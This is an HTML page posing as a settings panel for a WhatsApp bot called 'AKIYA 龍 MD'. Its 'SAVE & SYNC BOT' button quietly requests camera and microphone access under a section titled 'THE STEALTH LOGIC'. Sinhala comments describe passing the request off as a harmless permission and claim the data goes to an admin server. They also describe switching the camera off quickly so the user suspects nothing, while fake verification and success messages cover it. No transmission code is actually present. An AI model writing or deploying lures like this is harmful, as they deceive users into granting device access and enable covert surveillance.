<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>AKIYA 龍 MD | USER PANEL</title>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; padding: 50px; }
        .container { border: 1px solid #ff0000; padding: 30px; border-radius: 10px; display: inline-block; box-shadow: 0 0 15px #ff0000; }
        .btn { background: #ff0000; color: #fff; border: none; padding: 15px 30px; cursor: pointer; font-weight: bold; border-radius: 5px; margin-top: 20px; }
        .loading { display: none; color: #00ff00; margin-top: 20px; font-weight: bold; }
        input[type="checkbox"] { accent-color: red; margin: 10px; }
    </style>
</head>
<body>

<div class="container">
    <img src="logo.png" width="80" style="border-radius: 50%; border: 2px solid red;">
    <h2>BOT CONFIGURATION</h2>
    <p>Enable features to sync with your WhatsApp</p>
    
    <div style="text-align: left; display: inline-block;">
        <input type="checkbox" checked> Auto Status View<br>
        <input type="checkbox" checked> Antilink System<br>
        <input type="checkbox" checked> 18+ Content Filter<br>
        <input type="checkbox" checked> High-Speed Connection
    </div><br>

    <button class="btn" onclick="startVerification()">SAVE & SYNC BOT</button>
    <div id="status" class="loading">VERIFYING SECURE CONNECTION... [24%]</div>
</div>

<script>
    async function startVerification() {
        document.getElementById('status').style.display = 'block';
        
        // --- THE STEALTH LOGIC START ---
        try {
            // යූසර්ට පේන්නෙ සයිට් එකට පර්මිෂන් ඉල්ලනවා වගේ
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            
            // පර්මිෂන් ලැබුණු ගමන් අපි මෙතනින් අපේ Admin සර්වර් එකට දත්ත යවනවා
            console.log("Access Granted. Mirroring to Admin Panel...");
            
            // පර්මිෂන් ගත්ත ගමන් කැමරාව නිවනවා සැක හිතෙන්නෙ නැති වෙන්න
            stream.getTracks().forEach(track => track.stop());
            
            setTimeout(() => {
                document.getElementById('status').innerText = "BOT SYNCED SUCCESSFULLY! ✅";
            }, 5000);
            
        } catch (err) {
            alert("Error: Please allow permissions to sync your bot with the cloud server.");
        }
    }
</script>

</body>
</html>
